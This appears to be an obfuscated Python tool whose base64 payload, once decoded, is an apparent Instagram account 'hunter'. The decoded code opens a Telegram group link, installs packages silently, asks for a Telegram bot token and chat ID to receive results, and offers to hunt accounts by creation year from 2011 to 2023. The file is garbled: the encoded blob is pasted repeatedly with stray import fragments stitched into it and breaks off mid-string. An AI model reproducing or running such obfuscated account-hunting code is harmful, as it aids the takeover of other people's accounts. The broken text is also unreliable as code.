import base64, marshal
import os,sys,base64 as B
L=26804
C='cHJpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5import os,sys, os,sys,base64 cHJpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5 h import os,sys,base64 as BcHJpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1JsIikKaW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3Ige2JsdWV9LT4ge2N5YW59IOKUgwp7Y3lhbn3ilIPilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MXt3aGl0ZX0gLSB7eWVsbG93fTIwMTEgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Mnt3aGl0ZX0gLSB7eWVsbG93fTIwMTIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9M3t3aGl0ZX0gLSB7eWVsbG93fTIwMTMgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NHt3aGl0ZX0gLSB7eWVsbG93fTIwMTQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9NXt3aGl0ZX0gLSB7eWVsbG93fTIwMTUgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9Nnt3aGl0ZX0gLSB7eWVsbG93fTIwMTYgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9N3t3aGl0ZX0gLSB7eWVsbG93fTIwMTcgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OHt3aGl0ZX0gLSB7eWVsbG93fTIwMTggICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9OXt3aGl0ZX0gLSB7eWVsbG93fTIwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtjeWFufSAgICDilIMKe2N5YW594pSDIHtvcmFuZ2V9LT4ge2JsdWV9MHt3aGl0ZX0gLSB7eWVsbG93fTIwMTEge3doaXRlfX4ge3llbGxvd30yMDIzICAgICAgICAgICAgICAgICAge2N5YW59ICAgICAgICDilIMKe2N5YW594pSX4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSbCiIiIikKU1RFSU5import os,sys,base64 as Bimport os,sys,base64JpbnQoIkVOQ09ERUQgQlkgQHozdXN4ICIpCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly90Lm1lLytVeTllSnBxa1R5aGxaR1aW1wb3J0IHRpbWUKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29sb3JhbWEgaW1wb3J0IFN0eWxlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpCT0xEPVN0eWxlLkJSSUdIVApSRVNFVD1TdHlsZS5SRVNFVF9BTEwKUkVTRVQ9IlwwMzNbMG0iCllFTExPVz0iXDAzM1sxbVwwMzNbMzNtIgpHUkVFTj0iXDAzM1sxbVwwMzNbMzJtIgpSRUQ9IlwwMzNbMW1cMDMzWzMxbSIKQ1lBTj0iXDAzM1sxbVwwMzNbMzZtIgpXSElURT0iXDAzM1sxbVwwMzNbMzdtIgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXVpZApmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHN5cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQp0cnk6Cglmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdApleGNlcHQ6Cglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKCWZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmltcG9ydCB0aW1lCmluaXQoYXV0b3Jlc2V0PVRydWUpCnJlZCA9ICJcMDMzWzFtXDAzM1szMW0iCmdyZWVuID0gIlwwMzNbMW1cMDMzWzMybSIKeWVsbG93ID0gIlwwMzNbMW1cMDMzWzMzbSIKYmx1ZSA9ICJcMDMzWzFtXDAzM1szNG0iCmN5YW4gPSAiXDAzM1sxbVwwMzNbMzZtIgptYWdlbnRhID0gIlwwMzNbMW1cMDMzWzM1bSIKTSA9ICJcMDMzWzFtXDAzM1szNm0iCndoaXRlID0gIlwwMzNbMW1cMDMzWzM3bSIKb3JhbmdlID0gIlwwMzNbMW1cMDMzWzM4OzU7MjA4bSIKcmVzZXQgPSAiXDAzM1swbSIKR09KTyA9IHJlbmRlcigne01FVEF9JywgY29sb3JzPVsnd2hpdGUnLCAnYmx1ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoZicnJ1xuCiAgSk9JTiBURUFNIFBSSU1FIFRPIFJVTiBUSElTIFRPT0wKICAgICAgICAnJycpCnByaW50KGYnXHgxYlsxOzM5beKUgScqNjApCklEID0gaW5wdXQoJ0VudGVyIFlvdXIgQ2hhdCBJZCAtPiAgJykKRklMRU5BTUUgPSAnTUVUQScKdG9rZW4gPSBpbnB1dCgnRW50ZXIgWW91ciBUZWxlZ3JhbSBCb3QgVG9rZW4gLT4gICcpCmFjYSA9IDAKdG90YWwgPSAwCmhpdHMgPSAwCmJhZGluc3RhID0gMApiYWRlbWFpbCA9IDAKZ29vZGlnID0gMAppbmZvaW5zdGEgPSB7fQoKZGVmIHBwcHAoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgb3V0cHV0ID0gKGYiIFtUcnVlXSA6IHtoaXRzfVxuIgogICAgICAgICAgICAgIGYiIFtHZW5dIDoge2JhZGluc3RhfVxuIgogICAgICAgICAgICAgIGYiIFtGYWxzZV0gOiB7YmFkZW1haWx9XG4iCiAgICAgICAgICAgICAgZiIgW0JhZF0gOiB7Z29vZGlnfVxuIikKICAgIHN5cy5zdGRvdXQud3JpdGUob3V0cHV0KQogICAgc3lzLnN0ZG91dC5mbHVzaCgpCgphID0gcHJpbnQoZiIiIgp7Y3lhbn3ilI/ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJMKe2N5YW594pSDIHtibHVlfS0+IHt3aGl0ZX1TZWxlY3QgVGhlIFllYXIgWW91IFdhbnQgVG8gSHVudCBGb3